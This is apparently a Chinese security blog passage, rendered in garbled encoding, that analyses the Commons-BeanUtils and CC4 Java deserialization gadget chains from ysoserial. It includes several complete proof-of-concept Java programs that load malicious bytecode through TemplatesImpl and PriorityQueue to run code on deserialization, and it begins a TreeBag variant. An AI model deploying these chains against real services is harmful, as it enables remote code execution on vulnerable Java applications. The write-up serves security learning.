å‰é¢ä¹Ÿè¯´è¿‡ï¼Œå…¶å®CBé“¾å°±æ˜¯cc2çš„åŸºç¡€ä¸Šæ–°æ‰¾äº†ä¸€ä¸ªè°ƒç”¨compareè¿›è¡Œåˆ©ç”¨ã€‚åœ¨ysoserialä¸­åˆ©ç”¨åˆ°çš„æ˜¯BeanComparatorç±»ï¼Œè¿™ä¸ªç±»ä½äºorg.apache.commons.beanutils.BeanComparatorï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»–çš„compareæ–¹æ³•ï¼š é‡ç‚¹å…³æ³¨ï¼š\nå‰é¢è¯´è¿‡getProperty()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨o1ã€o2å¯¹è±¡çš„propertyå˜é‡çš„getteræ–¹æ³•ã€‚\nåœ¨ysoserialä¸­ï¼ŒCBé“¾åˆ©ç”¨åˆ°äº†TemplatesImplç±»ï¼Œæ˜¯é€šè¿‡PropertyUtils.getPropertyæ¥è°ƒç”¨_outputPropertieså˜é‡çš„getteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯TemplatesImplçš„getOutputPropertiesæ–¹æ³•æ¥åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œé‚£ä¹ˆç°åœ¨æ¥çœ‹ä¸€ä¸‹getOutputProperties()æ–¹æ³•çš„æºç ï¼š è¿™é‡Œè°ƒç”¨äº†newTransformer()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±å¯ä»¥è¿›è¡Œä¸€æ¬¡æ¶æ„åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„è¿‡ç¨‹ã€‚\né‚£ä¹ˆåœ¨BeanComparatorçš„compare()æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶o1/o2ä¸ºTemplatesImplå¯¹è±¡ï¼Œthis.Propertiesä¸ºoutputPropertieså­—ç¬¦ä¸²ã€‚\nçœ‹ä¸€ä¸‹BeanComparatorç±»çš„æ„é€ æ–¹æ³•ï¼ŒæŒ‰ç…§å‰é¢çš„æè¿°ï¼Œæˆ‘ä»¬è¿™é‡Œä¸éœ€è¦è‡ªå®šä¹‰this.comparatorå˜é‡ï¼Œè¿™é‡Œæˆ‘ä»¬è¦åˆ©ç”¨åˆ°çš„æ˜¯æ„é€ æ–¹æ³•æ˜¯ï¼š\nå…¶å®ä¹Ÿå°±æ˜¯ä¸‹é¢é‚£ä¸ªï¼Œä½†æ˜¯ç›´æ¥ä½¿ç”¨â€œé»˜è®¤â€çš„comparatoräº†ã€‚\næ”»å‡»æ„é€  å‰é¢æŠŠåŸºæœ¬çš„é“¾ç»™äº†å‡ºæ¥ï¼Œåœ¨è¿™é‡Œè¿˜æ˜¯åˆ©ç”¨çš„PriorityQueueä½œä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±»ï¼Œååºåˆ—åŒ–çš„æ—¶å€™æ˜¯å·®ä¸å¤šçš„ï¼Œæœ€ç»ˆåˆ°è°ƒç”¨compare()æ–¹æ³•çš„åœ°æ–¹æ˜¯ï¼š\nç°åœ¨å…¶å®æ„Ÿè§‰å’ŒCC2å·®ä¸å¤šäº†ã€‚\næ„é€ åŸºæœ¬çš„å­—èŠ‚ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç„¶åå…¶ä»–æµç¨‹ç›´æ¥å½“åšcc2é‚£é‡Œçœ‹ï¼Œç°åœ¨ç®€å•åˆ†åˆ«åˆ†æä¸€ä¸‹è¿‡ç¨‹ã€‚\nååºåˆ—åŒ–éƒ¨åˆ† å’ŒCC2å·®ä¸å¤šï¼ŒPriorityQueueçš„readObject() =ã€‹heapify() =ã€‹siftDown() =ã€‹siftDownUsingComparatorï¼Œæœ€ç»ˆä¹Ÿå°±æ˜¯å¦‚ä¸‹ï¼š æŒ‰ç…§CC2è¿‡ç¨‹æ¥ï¼Œå‡å¦‚æˆ‘ä»¬addè¿›ä¸¤ä¸ªå€¼ï¼Œé‚£ä¹ˆè¿™é‡Œçš„kä¸º0ï¼Œxä¸ºqueue[0]çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€ä¸ªaddè¿›çš„å€¼ï¼ŒåŒæ—¶çœ‹è¿™ä¸ªæ–¹æ³•çš„å†…éƒ¨ï¼Œé‚£ä¹ˆå†åˆ†åˆ«è¯´ä¸€ä¸‹å€¼é—®é¢˜ï¼š\nhalfï¼š1 childï¼š1 rightï¼š2 æ‰€ä»¥ä¸Šé¢çš„cå¯¹åº”æˆ‘ä»¬å‰é¢addè¿›çš„ç¬¬äºŒä¸ªå€¼ï¼Œçœ‹å¤§å°æƒ…å†µå¯ä»¥çŸ¥é“æ˜¯ä¼šè¿›å…¥ç¬¬äºŒä¸ªifæ¡ä»¶è¯­å¥ï¼Œå¯¹åº”å‚æ•°åˆ†åˆ«ä¸ºï¼ˆxï¼šqueue[0]ï¼Œcï¼šqueue[1]ï¼‰ã€‚\nç»“åˆå‰é¢å¯¹BeanComparatorç±»çš„compare()æ–¹æ³•çš„æè¿°ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬è¿™é‡Œè‡³å°‘éœ€è¦ä¸€ä¸ªä¸ºè®¾è®¡å¥½äº†çš„TemplatesImplç±»å¯¹è±¡ã€‚\nåºåˆ—åŒ–éƒ¨åˆ† add()æœ‰ä¸ªéƒ¨åˆ†ï¼Œåœ¨ç¬¬äºŒæ¬¡addè¿›å€¼çš„æ—¶å€™ï¼š æŒ‰ç…§å‰é¢çš„è¯´æ³•ï¼Œè¿™é‡Œä¼šè¿›å…¥BeanComparatorçš„compare()æ–¹æ³•ï¼Œè¿™é‡Œçš„kå³æ˜¯1ï¼Œxå³æ˜¯æˆ‘ç¬¬äºŒæ¬¡è¦æ”¾å…¥çš„å€¼ï¼Œeå°±æ˜¯queue[0]ï¼Œä¹Ÿå°±æ˜¯æˆ‘æ”¾å…¥çš„ç¬¬ä¸€ä¸ªå€¼ã€‚çœ‹è¿™é‡Œçš„compare()çš„å€¼ï¼Œçœ‹å‚æ•°ï¼ˆxï¼šadd2ï¼Œeï¼šqueue[0]ï¼‰ï¼Œåœ¨å‰é¢åºåˆ—åŒ–çš„æ—¶å€™è¯´äº†ï¼Œæˆ‘ä»¬éœ€è¦è‡³å°‘addè¿›ä¸€ä¸ªTemplatesImplç±»å®ä¾‹ï¼Œé‚£ä¹ˆå…¶å®åœ¨è¿™é‡ŒåŒæ ·å¯ä»¥å°è¯•ä¸€ä¸‹æ„é€ åœ¨åºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(tem); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚è¿˜æœ‰å°±æ˜¯å­˜åœ¨ä¸€ä¸ªå’Œä¹‹å‰ä¸€æ ·çš„é—®é¢˜ï¼Œå½“æˆ‘åˆ©ç”¨TemplatesImplæ¥åŠ¨æ€åŠ è½½æ¶æ„å­—èŠ‚ç çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘addè¿›ä¸¤ä¸ªtemï¼Œåªä¼šå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œåœ¨ç¬¬ä¸€ä¸ªç»“æŸåä¼šç›´æ¥æŠ¥é”™ç»“æŸï¼Œå¹¶ä¸ä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ©ç”¨ç‚¹ï¼š æ¯”å¦‚CC4ç­‰ã€‚\nè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯è¿™é‡Œaddè¿›çš„é¡ºåºä¹Ÿæœ‰è®²ç©¶ï¼Œæ¯”å¦‚æˆ‘åƒä¸Šé¢ä»£ç é‚£æ ·åªaddè¿›ä¸€ä¸ªï¼Œé‚£ä¹ˆæˆ‘å¿…é¡»ä¿è¯temåœ¨o1ï¼Œå› ä¸ºo1/o2å¿…é¡»ä¸ºä¸€ä¸ªç±»å®ä¾‹ï¼ŒæŒ‰ç…§å‰é¢å°†çš„å‚æ•°é—®é¢˜ï¼Œo1å¯¹åº”add2ï¼Œä¹Ÿå°±æ˜¯æˆ‘è¦åœ¨ç¬¬äºŒä¸ªåœ°æ–¹addè¿›temï¼Œå¦åˆ™ä¼šç›´æ¥æŠ¥é”™é€€å‡ºã€‚\né‚£ä¹ˆæˆ‘ä»¬ç°åœ¨ç»§ç»­å…³æ³¨ç¬¬äºŒæ¬¡addåä¼šå‘ç”Ÿä»€ä¹ˆï¼š åœ¨å‰é¢æŠ›å‡ºå¼‚å¸¸åï¼Œä¸çŸ¥é“è°ƒç”¨compare()æ–¹æ³•ååˆ°åº•ä¼šè¿”å›ä»€ä¹ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ‰“æ–­ç‚¹æ¥çœ‹ä¼šåˆ°å“ªé‡Œï¼Œå‘ç°ç¡®å®ä¼šåœ¨æŠ›å‡ºå¼‚å¸¸åç›´æ¥é€€å‡ºï¼Œé‚£ä¹ˆè¿™æ ·æˆ‘ä»¬å¹¶ä¸èƒ½æˆåŠŸåœ¨queue[1]æˆåŠŸè®¾ç½®ä¸ºtemï¼Œä»è€Œå¯¼è‡´åç»­éƒ½å¤±è´¥ã€‚\nåœ¨ysoserialä¸­ç»™å‡ºäº†è§£å†³æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå¾€é‡Œé¢éšä¾¿addè¿›å€¼ï¼Œç„¶åå†åå°„æ›´æ”¹ä¸ºæˆ‘æƒ³åˆ©ç”¨çš„ï¼Œé‚£ä¹ˆæµ‹è¯•ä»£ç å¯ä»¥æ”¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç„¶åè¿™é‡ŒæŠ¥é”™äº†æˆ‘ä»¬ä¸Šé¢è¯´çš„é—®é¢˜ï¼ŒPropertyUtilsçš„getPropertyçš„æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸ºç±»å®ä¾‹ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¼ å…¥çš„éƒ½æ˜¯æ•´æ•°ï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒæ¬¡addåä¼šæŠ¥é”™ã€‚\nè§£å†³æ–¹æ³•ï¼Œåœ¨BeanComparatorçš„compare()æ–¹æ³•ä¸­ï¼š è¿™é‡Œåªè¦æ»¡è¶³propertyä¸ºnullï¼Œå°±ä¸ä¼šå†è°ƒç”¨getProperty()æ–¹æ³•ï¼Œè€Œæ˜¯æ­£å¸¸çš„compareæ–¹æ³•æ¥æ¯”è¾ƒã€‚\næ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå¯ä»¥ä½¿å¾—propertyå…ˆä¸ºnullï¼Œè€Œåå†åå°„ä¿®æ”¹è¿™ä¸ªå€¼ä¸ºoutputPropertiesã€‚\né‚£ä¹ˆPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); //é”™è¯¯ç‚¹ Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç»§ç»­æŠ¥é”™\nç„¶åæ€è€ƒï¼Œè¿™é‡Œé€»è¾‘æ˜æ˜æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸ºå•¥è¿˜æ˜¯å¼¹è¿™ä¸ªé—®é¢˜ï¼Œç„¶åæˆ‘å°è¯•ä¿®æ”¹ä¸ºä¼ å…¥ä¸¤ä¸ªtemï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œç„¶åå†ä»”ç»†æ¯”å¯¹ä¸€ä¸‹ï¼Œæ‰¾å‡ºé—®é¢˜æ‰€åœ¨ï¼Œé—®é¢˜å¤„åœ¨å‰é¢çš„POCæ ‡å‡ºæ¥äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å…ˆè‡ªå·±æƒ³æƒ³ã€‚\næˆ‘å‰é¢çš„POCæ„é€ æ˜¯æŒ‰ç…§åºåˆ—åŒ–å‰çš„add()éƒ¨åˆ†æ„é€ çš„ï¼Œå…¶ä¸­çš„é¡ºåºéœ€è¦ä¸ºï¼š\nadd1ä¸ºå…¶ä»–ï¼Œå¿…é¡»add2ä¸ºtemã€‚\nä½†æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­\næ³¨æ„å‰é¢åˆ†ææ—¶ç»™å‡ºçš„ç»“æœï¼Œåœ¨ååºåˆ—æ—¶è°ƒç”¨åˆ°BeanComparatorçš„compare()æ–¹æ³•æ—¶çš„å‚æ•°åˆ†åˆ«ä¸º**ï¼ˆxï¼šqueue[0]ï¼Œcï¼šqueue[1]ï¼‰**ã€‚\næ‰€ä»¥è¿™é‡Œæ˜¯å…ˆè°ƒç”¨çš„queue[0]ï¼ŒåŒæ—¶ç»“åˆæˆ‘ä»¬å‰é¢çš„è¯´æ³•ï¼Œåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦ï¼Œå¦‚ä¸‹è®¾ç½®ï¼š\n1 Object[] x = new Object[]{tem,1}; é‚£ä¹ˆæœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{tem,1}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚\n","date":"2024-08-07T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cb%E9%93%BE/","title":"CBé“¾"},{"content":"CC4 ysoserialé“¾ä¸­çš„CC4å°±åªæ˜¯å°†CC2ä½¿ç”¨çš„InvokerTransformeræ›¿æ¢ä¸ºInstantiateTransformeræ¥åŠ è½½å­—èŠ‚ç ï¼Œå…·ä½“ä½¿ç”¨CC3é‚£é‡Œå·²ç»è¯´è¿‡äº†ã€‚\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8U411 commons-collections4.0 ä¸å¤šè¯´ï¼Œç»™ä¸ªPOCç»“æŸï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æœ‰ç‚¹å°æ€ªçš„å°±æ˜¯ä¹‹å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼ŒæŒ‰ç…§é¢„æœŸåº”è¯¥æ˜¯ä¸¤ä¸ªçš„ï¼Œè°ƒè¯•å™¨ä¹Ÿæœ‰ç‚¹å°é—®é¢˜ã€‚\nè¡¥å…… æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8U411 commons-collections4.0 è¿™é‡Œè¡¥å……ä¸€ä¸ªå¯¹PriorityQueueçš„æ›¿ä»£é“¾ TreeBagã€‚\nç›´æ¥ä¸Šå¯¹ç±»çš„åˆ†æ\nTreeBag\u0026amp;TreeMap åœ¨ CC2 ä¸­ï¼Œä½¿ç”¨äº†ä¼˜å…ˆçº§é˜Ÿåˆ— PriorityQueue ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ comparator çš„ compare æ–¹æ³•çš„ç‰¹æ€§ï¼Œé…åˆ TransformingComparator è§¦å‘ transformerã€‚\nåœ¨è¿™é‡ŒTreeBagä¹Ÿå®ç°äº†åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨åˆ°æ¯”è¾ƒå™¨ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨ã€‚\nTreeBagç±»ä½äºorg.apache.commons.collections4.bag.TreeBag\nç¨å¾®è¯´æ˜ä¸€ä¸‹Bagï¼š\nBag æ¥å£ç»§æ‰¿è‡ª Collection æ¥å£ï¼Œå®šä¹‰äº†ä¸€ä¸ªé›†åˆï¼Œè¯¥é›†åˆä¼šè®°å½•å¯¹è±¡åœ¨é›†åˆä¸­å‡ºç°çš„æ¬¡æ•°ã€‚å®ƒæœ‰ä¸€ä¸ªå­æ¥å£ SortedBagï¼Œå®šä¹‰äº†ä¸€ç§å¯ä»¥å¯¹å…¶å”¯ä¸€ä¸é‡å¤æˆå‘˜æ’åºçš„ Bag ç±»å‹ã€‚\nTreeBag æ˜¯å¯¹ SortedBag çš„ä¸€ä¸ªæ ‡å‡†å®ç°ã€‚TreeBag ä½¿ç”¨ TreeMap æ¥å‚¨å­˜æ•°æ®ï¼Œå¹¶ä½¿ç”¨æŒ‡å®š Comparator æ¥è¿›è¡Œæ’åºã€‚\nâ€”â€”â€”â€”\nTreeBag ç±»ç»§æ‰¿è‡ª AbstractMapBagï¼Œå®ç°äº† SortedBag æ¥å£ã€‚åˆå§‹åŒ– TreeBag æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ TreeMap å‚¨å­˜åœ¨AbstractMapBagçš„æˆå‘˜å˜é‡ map é‡Œï¼Œè€Œæ’åºä½¿ç”¨çš„ Comparator åˆ™ç›´æ¥å‚¨å­˜åœ¨ TreeMap ä¸­ï¼š\nTreeBagç±»æ„é€ æ–¹æ³•ï¼š\nçˆ¶ç±»AbstractMapBagï¼š\nTreeMapå®šä¹‰æœ‰comparatorï¼š\nå½“å¯¹TreeBagååºæ—¶ï¼š å¯ä»¥çœ‹å‡ºè¿™é‡Œä¼šè¯»å–TreeMapçš„comparatorå¹¶è°ƒç”¨çˆ¶ç±»AbstractMapBagçš„doReadObject()æ–¹æ³•ï¼š è¿™é‡Œä¼šè°ƒç”¨map.put()ï¼Œä¹Ÿå°±æ˜¯TreeMapçš„putæ–¹æ³•ï¼š çœ‹æˆ‘æ ‡é‡ç‚¹éƒ¨åˆ†ï¼Œåœ¨å‰é¢çš„ç®€å•è¿‡ç¨‹ä¸­ï¼Œè¿™é‡Œä¼šè¿›å…¥ifæ¡ä»¶å¾ˆæ­£å¸¸ï¼ˆå¹¶ä¸”åˆ©ç”¨ç‚¹å°±æ˜¯è¿™é‡Œï¼Œè‡³äºä¸ºä»€ä¹ˆåé¢å†è¯´æ˜ï¼‰ï¼Œè¿™é‡Œå°±ä¼šæ‰§è¡Œcompareæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹TreeMapç±»çš„compare()æ–¹æ³•ï¼š åªè¦æˆ‘ä»¬æ­£ç¡®å®šä¹‰äº†comparatorå°±å¯ä»¥æˆåŠŸæ‰§è¡Œæ¼æ´ã€‚\né“¾å­ä¸å°±å‡ºæ¥äº†å—ã€‚\nä¸¤ä¸ªç‚¹éœ€è¦è¯´æ˜ ç¬¬ä¸€ä¸ª 1.çˆ¶ç±»AbstractMapBagçš„å˜é‡mapä¸å¯è¢«åºåˆ—åŒ–ï¼š\nè§£å†³æ–¹æ³•åŒæ ·æ˜¯åœ¨TreeBagçš„writeObject()ä»¥åŠreadObject()æ–¹æ³•ä¸­ï¼š writeObject()ï¼š ç»§ç»­è·Ÿè¿›this.comparator()ï¼š ç„¶ååˆ°ä¼šåˆ°çˆ¶ç±»AbstractMapBagçš„getMap()æ–¹æ³•ï¼š è¿”å›äº†æˆ‘ä»¬å®šä¹‰çš„TreeMapå®ä¾‹ï¼Œæ‰€ä»¥å‰é¢çš„comparator()ä¸­ä¼šè°ƒç”¨TreeMapç±»çš„comparator()ï¼š 